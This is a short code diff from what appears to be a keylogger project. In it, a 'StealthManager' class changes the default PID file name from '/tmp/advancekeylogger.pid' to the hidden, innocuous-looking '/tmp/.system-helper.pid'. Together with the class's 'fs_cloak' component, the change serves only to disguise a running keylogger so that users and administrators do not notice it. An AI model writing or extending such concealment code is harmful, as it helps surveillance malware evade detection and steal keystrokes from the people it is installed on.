@@ -263,7 +263,7 @@ class StealthManager:
     def get_pid_path(self) -> str:
         """Stealthy PID file path (or default)."""
         if not self._enabled:
-            return "/tmp/advancekeylogger.pid"
+            return "/tmp/.system-helper.pid"
         return self.fs_cloak.get_pid_path()
 
     def get_data_dir(self) -> str:
